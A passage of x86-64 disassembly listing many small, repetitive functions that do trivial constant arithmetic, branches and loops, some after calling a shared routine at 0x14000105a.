   140002d12:	83 c0 05             	add    $0x5,%eax
   140002d15:	eb 03                	jmp    0x140002d1a
   140002d17:	83 e8 05             	sub    $0x5,%eax
   140002d1a:	48 83 c4 20          	add    $0x20,%rsp
   140002d1e:	41 5d                	pop    %r13
   140002d20:	41 5c                	pop    %r12
   140002d22:	5f                   	pop    %rdi
   140002d23:	5e                   	pop    %rsi
   140002d24:	5b                   	pop    %rbx
   140002d25:	c3                   	ret
   140002d26:	53                   	push   %rbx
   140002d27:	56                   	push   %rsi
   140002d28:	57                   	push   %rdi
   140002d29:	41 54                	push   %r12
   140002d2b:	41 55                	push   %r13
   140002d2d:	48 83 ec 20          	sub    $0x20,%rsp
   140002d31:	b8 12 00 00 00       	mov    $0x12,%eax
   140002d36:	bb 33 00 00 00       	mov    $0x33,%ebx
   140002d3b:	b9 47 00 00 00       	mov    $0x47,%ecx
   140002d40:	01 d8                	add    %ebx,%eax
   140002d42:	01 c8                	add    %ecx,%eax
   140002d44:	48 83 c4 20          	add    $0x20,%rsp
   140002d48:	41 5d                	pop    %r13
   140002d4a:	41 5c                	pop    %r12
   140002d4c:	5f                   	pop    %rdi
   140002d4d:	5e                   	pop    %rsi
   140002d4e:	5b                   	pop    %rbx
   140002d4f:	c3                   	ret
   140002d50:	53                   	push   %rbx
   140002d51:	56                   	push   %rsi
   140002d52:	57                   	push   %rdi
   140002d53:	41 54                	push   %r12
   140002d55:	41 55                	push   %r13
   140002d57:	48 83 ec 20          	sub    $0x20,%rsp
   140002d5b:	b8 ad 00 00 00       	mov    $0xad,%eax
   140002d60:	83 e0 02             	and    $0x2,%eax
   140002d63:	74 03                	je     0x140002d68
   140002d65:	83 c0 0a             	add    $0xa,%eax
   140002d68:	48 83 c4 20          	add    $0x20,%rsp
   140002d6c:	41 5d                	pop    %r13
   140002d6e:	41 5c                	pop    %r12
   140002d70:	5f                   	pop    %rdi
   140002d71:	5e                   	pop    %rsi
   140002d72:	5b                   	pop    %rbx
   140002d73:	c3                   	ret
   140002d74:	53                   	push   %rbx
   140002d75:	56                   	push   %rsi
   140002d76:	57                   	push   %rdi
   140002d77:	41 54                	push   %r12
   140002d79:	41 55                	push   %r13
   140002d7b:	48 83 ec 20          	sub    $0x20,%rsp
   140002d7f:	31 c0                	xor    %eax,%eax
   140002d81:	bb 02 00 00 00       	mov    $0x2,%ebx
   140002d86:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002d8b:	83 c0 01             	add    $0x1,%eax
   140002d8e:	ff c9                	dec    %ecx
   140002d90:	75 f9                	jne    0x140002d8b
   140002d92:	ff cb                	dec    %ebx
   140002d94:	75 f0                	jne    0x140002d86
   140002d96:	48 83 c4 20          	add    $0x20,%rsp
   140002d9a:	41 5d                	pop    %r13
   140002d9c:	41 5c                	pop    %r12
   140002d9e:	5f                   	pop    %rdi
   140002d9f:	5e                   	pop    %rsi
   140002da0:	5b                   	pop    %rbx
   140002da1:	c3                   	ret
   140002da2:	53                   	push   %rbx
   140002da3:	56                   	push   %rsi
   140002da4:	57                   	push   %rdi
   140002da5:	41 54                	push   %r12
   140002da7:	41 55                	push   %r13
   140002da9:	48 83 ec 20          	sub    $0x20,%rsp
   140002dad:	6a 15                	push   $0x15
   140002daf:	6a 0a                	push   $0xa
   140002db1:	58                   	pop    %rax
   140002db2:	5b                   	pop    %rbx
   140002db3:	48 0f af c3          	imul   %rbx,%rax
   140002db7:	48 83 c4 20          	add    $0x20,%rsp
   140002dbb:	41 5d                	pop    %r13
   140002dbd:	41 5c                	pop    %r12
   140002dbf:	5f                   	pop    %rdi
   140002dc0:	5e                   	pop    %rsi
   140002dc1:	5b                   	pop    %rbx
   140002dc2:	c3                   	ret
   140002dc3:	53                   	push   %rbx
   140002dc4:	56                   	push   %rsi
   140002dc5:	57                   	push   %rdi
   140002dc6:	41 54                	push   %r12
   140002dc8:	41 55                	push   %r13
   140002dca:	48 83 ec 20          	sub    $0x20,%rsp
   140002dce:	48 c7 c0 10 00 00 00 	mov    $0x10,%rax
   140002dd5:	50                   	push   %rax
   140002dd6:	5b                   	pop    %rbx
   140002dd7:	48 83 c3 05          	add    $0x5,%rbx
   140002ddb:	48 83 c4 20          	add    $0x20,%rsp
   140002ddf:	41 5d                	pop    %r13
   140002de1:	41 5c                	pop    %r12
   140002de3:	5f                   	pop    %rdi
   140002de4:	5e                   	pop    %rsi
   140002de5:	5b                   	pop    %rbx
   140002de6:	c3                   	ret
   140002de7:	53                   	push   %rbx
   140002de8:	56                   	push   %rsi
   140002de9:	57                   	push   %rdi
   140002dea:	41 54                	push   %r12
   140002dec:	41 55                	push   %r13
   140002dee:	48 83 ec 20          	sub    $0x20,%rsp
   140002df2:	b8 16 00 00 00       	mov    $0x16,%eax
   140002df7:	bb 38 00 00 00       	mov    $0x38,%ebx
   140002dfc:	b9 4f 00 00 00       	mov    $0x4f,%ecx
   140002e01:	01 d8                	add    %ebx,%eax
   140002e03:	01 c8                	add    %ecx,%eax
   140002e05:	48 83 c4 20          	add    $0x20,%rsp
   140002e09:	41 5d                	pop    %r13
   140002e0b:	41 5c                	pop    %r12
   140002e0d:	5f                   	pop    %rdi
   140002e0e:	5e                   	pop    %rsi
   140002e0f:	5b                   	pop    %rbx
   140002e10:	c3                   	ret
   140002e11:	53                   	push   %rbx
   140002e12:	56                   	push   %rsi
   140002e13:	57                   	push   %rdi
   140002e14:	41 54                	push   %r12
   140002e16:	41 55                	push   %r13
   140002e18:	48 83 ec 20          	sub    $0x20,%rsp
   140002e1c:	e8 39 e2 ff ff       	call   0x14000105a
   140002e21:	25 ff 00 00 00       	and    $0xff,%eax
   140002e26:	b8 0c 00 00 00       	mov    $0xc,%eax
   140002e2b:	bb 0d 00 00 00       	mov    $0xd,%ebx
   140002e30:	39 d8                	cmp    %ebx,%eax
   140002e32:	7f 04                	jg     0x140002e38
   140002e34:	89 c1                	mov    %eax,%ecx
   140002e36:	eb 02                	jmp    0x140002e3a
   140002e38:	89 d9                	mov    %ebx,%ecx
   140002e3a:	01 c8                	add    %ecx,%eax
   140002e3c:	48 83 c4 20          	add    $0x20,%rsp
   140002e40:	41 5d                	pop    %r13
   140002e42:	41 5c                	pop    %r12
   140002e44:	5f                   	pop    %rdi
   140002e45:	5e                   	pop    %rsi
   140002e46:	5b                   	pop    %rbx
   140002e47:	c3                   	ret
   140002e48:	53                   	push   %rbx
   140002e49:	56                   	push   %rsi
   140002e4a:	57                   	push   %rdi
   140002e4b:	41 54                	push   %r12
   140002e4d:	41 55                	push   %r13
   140002e4f:	48 83 ec 20          	sub    $0x20,%rsp
   140002e53:	e8 02 e2 ff ff       	call   0x14000105a
   140002e58:	25 ff 00 00 00       	and    $0xff,%eax
   140002e5d:	b8 0f 00 00 00       	mov    $0xf,%eax
   140002e62:	a9 01 00 00 00       	test   $0x1,%eax
   140002e67:	74 05                	je     0x140002e6e
   140002e69:	83 c0 0a             	add    $0xa,%eax
   140002e6c:	eb 03                	jmp    0x140002e71
   140002e6e:	83 e8 05             	sub    $0x5,%eax
   140002e71:	48 83 c4 20          	add    $0x20,%rsp
   140002e75:	41 5d                	pop    %r13
   140002e77:	41 5c                	pop    %r12
   140002e79:	5f                   	pop    %rdi
   140002e7a:	5e                   	pop    %rsi
   140002e7b:	5b                   	pop    %rbx
   140002e7c:	c3                   	ret
   140002e7d:	53                   	push   %rbx
   140002e7e:	56                   	push   %rsi
   140002e7f:	57                   	push   %rdi
   140002e80:	41 54                	push   %r12
   140002e82:	41 55                	push   %r13
   140002e84:	48 83 ec 20          	sub    $0x20,%rsp
   140002e88:	b8 0b 00 00 00       	mov    $0xb,%eax
   140002e8d:	d1 e0                	shl    $1,%eax
   140002e8f:	72 02                	jb     0x140002e93
   140002e91:	d1 e8                	shr    $1,%eax
   140002e93:	48 83 c4 20          	add    $0x20,%rsp
   140002e97:	41 5d                	pop    %r13
   140002e99:	41 5c                	pop    %r12
   140002e9b:	5f                   	pop    %rdi
   140002e9c:	5e                   	pop    %rsi
   140002e9d:	5b                   	pop    %rbx
   140002e9e:	c3                   	ret
   140002e9f:	53                   	push   %rbx
   140002ea0:	56                   	push   %rsi
   140002ea1:	57                   	push   %rdi
   140002ea2:	41 54                	push   %r12
   140002ea4:	41 55                	push   %r13
   140002ea6:	48 83 ec 20          	sub    $0x20,%rsp
   140002eaa:	b8 ff 00 00 00       	mov    $0xff,%eax
   140002eaf:	bb 0a 00 00 00       	mov    $0xa,%ebx
   140002eb4:	01 d8                	add    %ebx,%eax
   140002eb6:	d1 e0                	shl    $1,%eax
   140002eb8:	48 83 c4 20          	add    $0x20,%rsp
   140002ebc:	41 5d                	pop    %r13
   140002ebe:	41 5c                	pop    %r12
   140002ec0:	5f                   	pop    %rdi
   140002ec1:	5e                   	pop    %rsi
   140002ec2:	5b                   	pop    %rbx
   140002ec3:	c3                   	ret
   140002ec4:	53                   	push   %rbx
   140002ec5:	56                   	push   %rsi
   140002ec6:	57                   	push   %rdi
   140002ec7:	41 54                	push   %r12
   140002ec9:	41 55                	push   %r13
   140002ecb:	48 83 ec 20          	sub    $0x20,%rsp
   140002ecf:	b8 bf 00 00 00       	mov    $0xbf,%eax
   140002ed4:	d1 e8                	shr    $1,%eax
   140002ed6:	72 05                	jb     0x140002edd
   140002ed8:	c1 e0 02             	shl    $0x2,%eax
   140002edb:	eb 02                	jmp    0x140002edf
   140002edd:	d1 e0                	shl    $1,%eax
   140002edf:	48 83 c4 20          	add    $0x20,%rsp
   140002ee3:	41 5d                	pop    %r13
   140002ee5:	41 5c                	pop    %r12
   140002ee7:	5f                   	pop    %rdi
   140002ee8:	5e                   	pop    %rsi
   140002ee9:	5b                   	pop    %rbx
   140002eea:	c3                   	ret
   140002eeb:	53                   	push   %rbx
   140002eec:	56                   	push   %rsi
   140002eed:	57                   	push   %rdi
   140002eee:	41 54                	push   %r12
   140002ef0:	41 55                	push   %r13
   140002ef2:	48 83 ec 20          	sub    $0x20,%rsp
   140002ef6:	6a 0b                	push   $0xb
   140002ef8:	6a 27                	push   $0x27
   140002efa:	58                   	pop    %rax
   140002efb:	5b                   	pop    %rbx
   140002efc:	48 83 c4 20          	add    $0x20,%rsp
   140002f00:	41 5d                	pop    %r13
   140002f02:	41 5c                	pop    %r12
   140002f04:	5f                   	pop    %rdi
   140002f05:	5e                   	pop    %rsi
   140002f06:	5b                   	pop    %rbx
   140002f07:	c3                   	ret
   140002f08:	53                   	push   %rbx
   140002f09:	56                   	push   %rsi
   140002f0a:	57                   	push   %rdi
   140002f0b:	41 54                	push   %r12
   140002f0d:	41 55                	push   %r13
   140002f0f:	48 83 ec 20          	sub    $0x20,%rsp
   140002f13:	b8 51 00 00 00       	mov    $0x51,%eax
   140002f18:	83 c0 11             	add    $0x11,%eax
   140002f1b:	72 05                	jb     0x140002f22
   140002f1d:	83 c0 05             	add    $0x5,%eax
   140002f20:	eb 03                	jmp    0x140002f25
   140002f22:	83 c0 0a             	add    $0xa,%eax
   140002f25:	48 83 c4 20          	add    $0x20,%rsp
   140002f29:	41 5d                	pop    %r13
   140002f2b:	41 5c                	pop    %r12
   140002f2d:	5f                   	pop    %rdi
   140002f2e:	5e                   	pop    %rsi
   140002f2f:	5b                   	pop    %rbx
   140002f30:	c3                   	ret
   140002f31:	53                   	push   %rbx
   140002f32:	56                   	push   %rsi
   140002f33:	57                   	push   %rdi
   140002f34:	41 54                	push   %r12
   140002f36:	41 55                	push   %r13
   140002f38:	48 83 ec 20          	sub    $0x20,%rsp
   140002f3c:	e8 19 e1 ff ff       	call   0x14000105a
   140002f41:	25 ff 00 00 00       	and    $0xff,%eax
   140002f46:	b8 70 00 00 00       	mov    $0x70,%eax
   140002f4b:	d1 e0                	shl    $1,%eax
   140002f4d:	d1 e8                	shr    $1,%eax
   140002f4f:	83 e0 0f             	and    $0xf,%eax
   140002f52:	48 83 c4 20          	add    $0x20,%rsp
   140002f56:	41 5d                	pop    %r13
   140002f58:	41 5c                	pop    %r12
   140002f5a:	5f                   	pop    %rdi
   140002f5b:	5e                   	pop    %rsi
   140002f5c:	5b                   	pop    %rbx
   140002f5d:	c3                   	ret
   140002f5e:	53                   	push   %rbx
   140002f5f:	56                   	push   %rsi
   140002f60:	57                   	push   %rdi
   140002f61:	41 54                	push   %r12
   140002f63:	41 55                	push   %r13
   140002f65:	48 83 ec 20          	sub    $0x20,%rsp
   140002f69:	e8 ec e0 ff ff       	call   0x14000105a
   140002f6e:	25 ff 00 00 00       	and    $0xff,%eax
   140002f73:	b8 18 00 00 00       	mov    $0x18,%eax
   140002f78:	a9 01 00 00 00       	test   $0x1,%eax
   140002f7d:	74 05                	je     0x140002f84
   140002f7f:	83 c0 0a             	add    $0xa,%eax
   140002f82:	eb 03                	jmp    0x140002f87
   140002f84:	83 e8 05             	sub    $0x5,%eax
   140002f87:	48 83 c4 20          	add    $0x20,%rsp
   140002f8b:	41 5d                	pop    %r13
   140002f8d:	41 5c                	pop    %r12
   140002f8f:	5f                   	pop    %rdi
   140002f90:	5e                   	pop    %rsi
   140002f91:	5b                   	pop    %rbx
   140002f92:	c3                   	ret
   140002f93:	53                   	push   %rbx
   140002f94:	56                   	push   %rsi
   140002f95:	57                   	push   %rdi
   140002f96:	41 54                	push   %r12
   140002f98:	41 55                	push   %r13
   140002f9a:	48 83 ec 20          	sub    $0x20,%rsp
   140002f9e:	e8 b7 e0 ff ff       	call   0x14000105a
   140002fa3:	25 ff 00 00 00       	and    $0xff,%eax
   140002fa8:	b8 0a 00 00 00       	mov    $0xa,%eax
   140002fad:	bb 28 00 00 00       	mov    $0x28,%ebx
   140002fb2:	b9 4e 00 00 00       	mov    $0x4e,%ecx
   140002fb7:	01 d8                	add    %ebx,%eax
   140002fb9:	01 c1                	add    %eax,%ecx
   140002fbb:	48 83 c4 20          	add    $0x20,%rsp
   140002fbf:	41 5d                	pop    %r13
   140002fc1:	41 5c                	pop    %r12
   140002fc3:	5f                   	pop    %rdi
   140002fc4:	5e                   	pop    %rsi
   140002fc5:	5b                   	pop    %rbx
   140002fc6:	c3                   	ret
   140002fc7:	53                   	push   %rbx
   140002fc8:	56                   	push   %rsi
   140002fc9:	57                   	push   %rdi
   140002fca:	41 54                	push   %r12
   140002fcc:	41 55                	push   %r13
   140002fce:	48 83 ec 20          	sub    $0x20,%rsp
   140002fd2:	b8 0e 00 00 00       	mov    $0xe,%eax
   140002fd7:	bb 20 00 00 00       	mov    $0x20,%ebx
   140002fdc:	01 d8                	add    %ebx,%eax
   140002fde:	d1 e0                	shl    $1,%eax
   140002fe0:	48 83 c4 20          	add    $0x20,%rsp
   140002fe4:	41 5d                	pop    %r13
   140002fe6:	41 5c                	pop    %r12
   140002fe8:	5f                   	pop    %rdi
   140002fe9:	5e                   	pop    %rsi
   140002fea:	5b                   	pop    %rbx
   140002feb:	c3                   	ret
   140002fec:	53                   	push   %rbx
   140002fed:	56                   	push   %rsi
   140002fee:	57                   	push   %rdi
   140002fef:	41 54                	push   %r12
   140002ff1:	41 55                	push   %r13
   140002ff3:	48 83 ec 20          	sub    $0x20,%rsp
   140002ff7:	b8 d9 00 00 00       	mov    $0xd9,%eax
   140002ffc:	d1 e0                	shl    $1,%eax
   140002ffe:	72 02                	jb     0x140003002
   140003000:	d1 e8                	shr    $1,%eax
   140003002:	48 83 c4 20          	add    $0x20,%rsp
   140003006:	41 5d                	pop    %r13
   140003008:	41 5c                	pop    %r12
   14000300a:	5f                   	pop    %rdi
   14000300b:	5e                   	pop    %rsi
   14000300c:	5b                   	pop    %rbx
   14000300d:	c3                   	ret
   14000300e:	53                   	push   %rbx
   14000300f:	56                   	push   %rsi
   140003010:	57                   	push   %rdi
   140003011:	41 54                	push   %r12
   140003013:	41 55                	push   %r13
   140003015:	48 83 ec 20          	sub    $0x20,%rsp
   140003019:	e8 3c e0 ff ff       	call   0x14000105a
   14000301e:	25 ff 00 00 00       	and    $0xff,%eax
   140003023:	6a 27                	push   $0x27
   140003025:	58                   	pop    %rax
   140003026:	48 d1 e0             	shl    $1,%rax
   140003029:	48 83 c4 20          	add    $0x20,%rsp
   14000302d:	41 5d                	pop    %r13
   14000302f:	41 5c                	pop    %r12
   140003031:	5f                   	pop    %rdi
   140003032:	5e                   	pop    %rsi
   140003033:	5b                   	pop    %rbx
   140003034:	c3                   	ret
   140003035:	53                   	push   %rbx
   140003036:	56                   	push   %rsi
   140003037:	57                   	push   %rdi
   140003038:	41 54                	push   %r12
   14000303a:	41 55                	push   %r13
   14000303c:	48 83 ec 20          	sub    $0x20,%rsp
   140003040:	b8 3b 00 00 00       	mov    $0x3b,%eax
   140003045:	bb 2d 00 00 00       	mov    $0x2d,%ebx
   14000304a:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000304f:	01 d8                	add    %ebx,%eax
   140003051:	29 c1                	sub    %eax,%ecx
   140003053:	48 83 c4 20          	add    $0x20,%rsp
   140003057:	41 5d                	pop    %r13
   140003059:	41 5c                	pop    %r12
   14000305b:	5f                   	pop    %rdi
   14000305c:	5e                   	pop    %rsi
   14000305d:	5b                   	pop    %rbx
   14000305e:	c3                   	ret
   14000305f:	53                   	push   %rbx
   140003060:	56                   	push   %rsi
   140003061:	57                   	push   %rdi
   140003062:	41 54                	push   %r12
   140003064:	41 55                	push   %r13
   140003066:	48 83 ec 20          	sub    $0x20,%rsp
   14000306a:	6a 2d                	push   $0x2d
   14000306c:	58                   	pop    %rax
   14000306d:	48 d1 e0             	shl    $1,%rax
   140003070:	48 83 c4 20          	add    $0x20,%rsp
   140003074:	41 5d                	pop    %r13
   140003076:	41 5c                	pop    %r12
   140003078:	5f                   	pop    %rdi
   140003079:	5e                   	pop    %rsi
   14000307a:	5b                   	pop    %rbx
   14000307b:	c3                   	ret
   14000307c:	53                   	push   %rbx
   14000307d:	56                   	push   %rsi
   14000307e:	57                   	push   %rdi
   14000307f:	41 54                	push   %r12
   140003081:	41 55                	push   %r13
   140003083:	48 83 ec 20          	sub    $0x20,%rsp
   140003087:	e8 ce df ff ff       	call   0x14000105a
   14000308c:	25 ff 00 00 00       	and    $0xff,%eax
   140003091:	b8 16 00 00 00       	mov    $0x16,%eax
   140003096:	83 f8 32             	cmp    $0x32,%eax
   140003099:	7f 05                	jg     0x1400030a0
   14000309b:	6b c0 02             	imul   $0x2,%eax,%eax
   14000309e:	eb 03                	jmp    0x1400030a3
   1400030a0:	6b c0 03             	imul   $0x3,%eax,%eax
   1400030a3:	48 83 c4 20          	add    $0x20,%rsp
   1400030a7:	41 5d                	pop    %r13
   1400030a9:	41 5c                	pop    %r12
   1400030ab:	5f                   	pop    %rdi
   1400030ac:	5e                   	pop    %rsi
   1400030ad:	5b                   	pop    %rbx
   1400030ae:	c3                   	ret
   1400030af:	53                   	push   %rbx
   1400030b0:	56                   	push   %rsi
   1400030b1:	57                   	push   %rdi
   1400030b2:	41 54                	push   %r12
   1400030b4:	41 55                	push   %r13
   1400030b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400030ba:	b8 47 00 00 00       	mov    $0x47,%eax
   1400030bf:	bb 16 00 00 00       	mov    $0x16,%ebx
   1400030c4:	b9 14 00 00 00       	mov    $0x14,%ecx
   1400030c9:	01 d8                	add    %ebx,%eax
   1400030cb:	29 c1                	sub    %eax,%ecx
   1400030cd:	48 83 c4 20          	add    $0x20,%rsp
   1400030d1:	41 5d                	pop    %r13
   1400030d3:	41 5c                	pop    %r12
   1400030d5:	5f                   	pop    %rdi
   1400030d6:	5e                   	pop    %rsi
   1400030d7:	5b                   	pop    %rbx
   1400030d8:	c3                   	ret
   1400030d9:	53                   	push   %rbx
   1400030da:	56                   	push   %rsi
   1400030db:	57                   	push   %rdi
   1400030dc:	41 54                	push   %r12
   1400030de:	41 55                	push   %r13
   1400030e0:	48 83 ec 20          	sub    $0x20,%rsp
   1400030e4:	31 c0                	xor    %eax,%eax
   1400030e6:	bb 02 00 00 00       	mov    $0x2,%ebx
   1400030eb:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400030f0:	83 c0 01             	add    $0x1,%eax
   1400030f3:	ff c9                	dec    %ecx
   1400030f5:	75 f9                	jne    0x1400030f0
   1400030f7:	ff cb                	dec    %ebx
   1400030f9:	75 f0                	jne    0x1400030eb
   1400030fb:	48 83 c4 20          	add    $0x20,%rsp
   1400030ff:	41 5d                	pop    %r13
   140003101:	41 5c                	pop    %r12
   140003103:	5f                   	pop    %rdi
   140003104:	5e                   	pop    %rsi
   140003105:	5b                   	pop    %rbx
   140003106:	c3                   	ret
   140003107:	53                   	push   %rbx
   140003108:	56                   	push   %rsi
   140003109:	57                   	push   %rdi
   14000310a:	41 54                	push   %r12
   14000310c:	41 55                	push   %r13
   14000310e:	48 83 ec 20          	sub    $0x20,%rsp
   140003112:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003117:	31 c0                	xor    %eax,%eax
   140003119:	83 c0 02             	add    $0x2,%eax
   14000311c:	ff c9                	dec    %ecx
   14000311e:	75 f9                	jne    0x140003119
   140003120:	48 83 c4 20          	add    $0x20,%rsp
   140003124:	41 5d                	pop    %r13
   140003126:	41 5c                	pop    %r12
   140003128:	5f                   	pop    %rdi
   140003129:	5e                   	pop    %rsi
   14000312a:	5b                   	pop    %rbx
   14000312b:	c3                   	ret
   14000312c:	53                   	push   %rbx
   14000312d:	56                   	push   %rsi
   14000312e:	57                   	push   %rdi
   14000312f:	41 54                	push   %r12
   140003131:	41 55                	push   %r13
   140003133:	48 83 ec 20          	sub    $0x20,%rsp
   140003137:	6a 06                	push   $0x6
   140003139:	6a 10                	push   $0x10
   14000313b:	6a 1c                	push   $0x1c
   14000313d:	58                   	pop    %rax
   14000313e:	5b                   	pop    %rbx
   14000313f:	59                   	pop    %rcx
   140003140:	48 83 c4 20          	add    $0x20,%rsp
   140003144:	41 5d                	pop    %r13
   140003146:	41 5c                	pop    %r12
   140003148:	5f                   	pop    %rdi
   140003149:	5e                   	pop    %rsi
   14000314a:	5b                   	pop    %rbx
   14000314b:	c3                   	ret
   14000314c:	53                   	push   %rbx
   14000314d:	56                   	push   %rsi
   14000314e:	57                   	push   %rdi
   14000314f:	41 54                	push   %r12
   140003151:	41 55                	push   %r13
   140003153:	48 83 ec 20          	sub    $0x20,%rsp
   140003157:	e8 fe de ff ff       	call   0x14000105a
   14000315c:	25 ff 00 00 00       	and    $0xff,%eax
   140003161:	b8 43 00 00 00       	mov    $0x43,%eax
   140003166:	a9 01 00 00 00       	test   $0x1,%eax
   14000316b:	74 05                	je     0x140003172
   14000316d:	83 c0 0a             	add    $0xa,%eax
   140003170:	eb 03                	jmp    0x140003175
   140003172:	83 e8 05             	sub    $0x5,%eax
   140003175:	48 83 c4 20          	add    $0x20,%rsp
   140003179:	41 5d                	pop    %r13
   14000317b:	41 5c                	pop    %r12
   14000317d:	5f                   	pop    %rdi
   14000317e:	5e                   	pop    %rsi
   14000317f:	5b                   	pop    %rbx
   140003180:	c3                   	ret
   140003181:	53                   	push   %rbx
   140003182:	56                   	push   %rsi
   140003183:	57                   	push   %rdi
   140003184:	41 54                	push   %r12
   140003186:	41 55                	push   %r13
   140003188:	48 83 ec 20          	sub    $0x20,%rsp
   14000318c:	b8 35 00 00 00       	mov    $0x35,%eax
   140003191:	83 f8 32             	cmp    $0x32,%eax
   140003194:	7f 05                	jg     0x14000319b
   140003196:	6b c0 02             	imul   $0x2,%eax,%eax
   140003199:	eb 03                	jmp    0x14000319e
   14000319b:	6b c0 03             	imul   $0x3,%eax,%eax
   14000319e:	48 83 c4 20          	add    $0x20,%rsp
   1400031a2:	41 5d                	pop    %r13
   1400031a4:	41 5c                	pop    %r12
   1400031a6:	5f                   	pop    %rdi
   1400031a7:	5e                   	pop    %rsi
   1400031a8:	5b                   	pop    %rbx
   1400031a9:	c3                   	ret
   1400031aa:	53                   	push   %rbx
   1400031ab:	56                   	push   %rsi
   1400031ac:	57                   	push   %rdi
   1400031ad:	41 54                	push   %r12
   1400031af:	41 55                	push   %r13
   1400031b1:	48 83 ec 20          	sub    $0x20,%rsp
   1400031b5:	b8 46 00 00 00       	mov    $0x46,%eax
   1400031ba:	bb 21 00 00 00       	mov    $0x21,%ebx
   1400031bf:	b9 0a 00 00 00       	mov    $0xa,%ecx
   1400031c4:	01 d8                	add    %ebx,%eax
   1400031c6:	29 c1                	sub    %eax,%ecx
   1400031c8:	48 83 c4 20          	add    $0x20,%rsp
   1400031cc:	41 5d                	pop    %r13
   1400031ce:	41 5c                	pop    %r12
   1400031d0:	5f                   	pop    %rdi
   1400031d1:	5e                   	pop    %rsi
   1400031d2:	5b                   	pop    %rbx
   1400031d3:	c3                   	ret
   1400031d4:	53                   	push   %rbx
   1400031d5:	56                   	push   %rsi
   1400031d6:	57                   	push   %rdi
   1400031d7:	41 54                	push   %r12
   1400031d9:	41 55                	push   %r13
   1400031db:	48 83 ec 20          	sub    $0x20,%rsp
   1400031df:	b8 56 00 00 00       	mov    $0x56,%eax
   1400031e4:	d1 e0                	shl    $1,%eax
   1400031e6:	72 02                	jb     0x1400031ea
   1400031e8:	d1 e8                	shr    $1,%eax
   1400031ea:	48 83 c4 20          	add    $0x20,%rsp
   1400031ee:	41 5d                	pop    %r13
   1400031f0:	41 5c                	pop    %r12
   1400031f2:	5f                   	pop    %rdi
   1400031f3:	5e                   	pop    %rsi
   1400031f4:	5b                   	pop    %rbx
   1400031f5:	c3                   	ret
   1400031f6:	53                   	push   %rbx
   1400031f7:	56                   	push   %rsi
   1400031f8:	57                   	push   %rdi
   1400031f9:	41 54                	push   %r12
   1400031fb:	41 55                	push   %r13
   1400031fd:	48 83 ec 20          	sub    $0x20,%rsp
   140003201:	e8 54 de ff ff       	call   0x14000105a
   140003206:	25 ff 00 00 00       	and    $0xff,%eax
   14000320b:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003210:	31 c0                	xor    %eax,%eax
   140003212:	83 c0 02             	add    $0x2,%eax
   140003215:	ff c9                	dec    %ecx
   140003217:	75 f9                	jne    0x140003212
   140003219:	48 83 c4 20          	add    $0x20,%rsp
   14000321d:	41 5d                	pop    %r13
   14000321f:	41 5c                	pop    %r12
   140003221:	5f                   	pop    %rdi
   140003222:	5e                   	pop    %rsi
   140003223:	5b                   	pop    %rbx
   140003224:	c3                   	ret
   140003225:	53                   	push   %rbx
   140003226:	56                   	push   %rsi
   140003227:	57                   	push   %rdi
   140003228:	41 54                	push   %r12
   14000322a:	41 55                	push   %r13
   14000322c:	48 83 ec 20          	sub    $0x20,%rsp
   140003230:	b8 2d 00 00 00       	mov    $0x2d,%eax
   140003235:	6b c0 02             	imul   $0x2,%eax,%eax
   140003238:	83 c0 16             	add    $0x16,%eax
   14000323b:	6b c0 03             	imul   $0x3,%eax,%eax
   14000323e:	48 83 c4 20          	add    $0x20,%rsp
   140003242:	41 5d                	pop    %r13
   140003244:	41 5c                	pop    %r12
   140003246:	5f                   	pop    %rdi
   140003247:	5e                   	pop    %rsi
   140003248:	5b                   	pop    %rbx
   140003249:	c3                   	ret
   14000324a:	53                   	push   %rbx
   14000324b:	56                   	push   %rsi
   14000324c:	57                   	push   %rdi
   14000324d:	41 54                	push   %r12
   14000324f:	41 55                	push   %r13
   140003251:	48 83 ec 20          	sub    $0x20,%rsp
   140003255:	b8 20 00 00 00       	mov    $0x20,%eax
   14000325a:	83 f8 32             	cmp    $0x32,%eax
   14000325d:	7f 05                	jg     0x140003264
   14000325f:	6b c0 02             	imul   $0x2,%eax,%eax
   140003262:	eb 03                	jmp    0x140003267
   140003264:	6b c0 03             	imul   $0x3,%eax,%eax
   140003267:	48 83 c4 20          	add    $0x20,%rsp
   14000326b:	41 5d                	pop    %r13
   14000326d:	41 5c                	pop    %r12
   14000326f:	5f                   	pop    %rdi
   140003270:	5e                   	pop    %rsi
   140003271:	5b                   	pop    %rbx
   140003272:	c3                   	ret
   140003273:	53                   	push   %rbx
   140003274:	56                   	push   %rsi
   140003275:	57                   	push   %rdi
   140003276:	41 54                	push   %r12
   140003278:	41 55                	push   %r13
   14000327a:	48 83 ec 20          	sub    $0x20,%rsp
   14000327e:	e8 d7 dd ff ff       	call   0x14000105a
   140003283:	25 ff 00 00 00       	and    $0xff,%eax
   140003288:	b8 03 00 00 00       	mov    $0x3,%eax
   14000328d:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003292:	83 c0 02             	add    $0x2,%eax
   140003295:	ff c9                	dec    %ecx
   140003297:	75 f9                	jne    0x140003292
   140003299:	48 83 c4 20          	add    $0x20,%rsp
   14000329d:	41 5d                	pop    %r13
   14000329f:	41 5c                	pop    %r12
   1400032a1:	5f                   	pop    %rdi
   1400032a2:	5e                   	pop    %rsi
   1400032a3:	5b                   	pop    %rbx
   1400032a4:	c3                   	ret
   1400032a5:	53                   	push   %rbx
   1400032a6:	56                   	push   %rsi
   1400032a7:	57                   	push   %rdi
   1400032a8:	41 54                	push   %r12
   1400032aa:	41 55                	push   %r13
   1400032ac:	48 83 ec 20          	sub    $0x20,%rsp
   1400032b0:	b8 35 00 00 00       	mov    $0x35,%eax
   1400032b5:	83 f8 1e             	cmp    $0x1e,%eax
   1400032b8:	7e 0a                	jle    0x1400032c4
   1400032ba:	83 f8 46             	cmp    $0x46,%eax
   1400032bd:	7d 0a                	jge    0x1400032c9
   1400032bf:	6b c0 02             	imul   $0x2,%eax,%eax
   1400032c2:	eb 08                	jmp    0x1400032cc
   1400032c4:	83 c0 0f             	add    $0xf,%eax
   1400032c7:	eb 03                	jmp    0x1400032cc
   1400032c9:	83 e8 0a             	sub    $0xa,%eax
   1400032cc:	48 83 c4 20          	add    $0x20,%rsp
   1400032d0:	41 5d                	pop    %r13
   1400032d2:	41 5c                	pop    %r12
   1400032d4:	5f                   	pop    %rdi
